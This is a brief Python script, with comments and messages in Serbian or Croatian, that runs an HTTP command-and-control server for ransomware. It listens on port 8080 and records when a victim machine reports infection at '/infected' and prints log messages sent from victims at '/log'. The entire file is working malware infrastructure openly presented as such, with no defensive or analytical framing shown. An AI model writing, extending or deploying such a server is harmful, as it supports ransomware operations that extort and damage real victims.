from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            parsed_path = urlparse(self.path)
            
            if parsed_path.path == '/infected':
                print("\n[!] DOBJENA KONEKCIJA SA ZRTVE!")
                print("[!!!] ALARM: Ransomware je pokrenut na masini zrtve!")
            
            elif parsed_path.path == '/log':
                query_params = parse_qs(parsed_path.query)
                msg = query_params.get('msg', [''])[0]
                print(f"  [LOG SA ZRTVE]: {msg}")
                
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            
        except (ConnectionResetError, BrokenPipeError):
            pass

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8080), C2Handler)
    print("[*] C2 Server slusa na portu 8080, ceka logove sa zrtve...")
    server.serve_forever()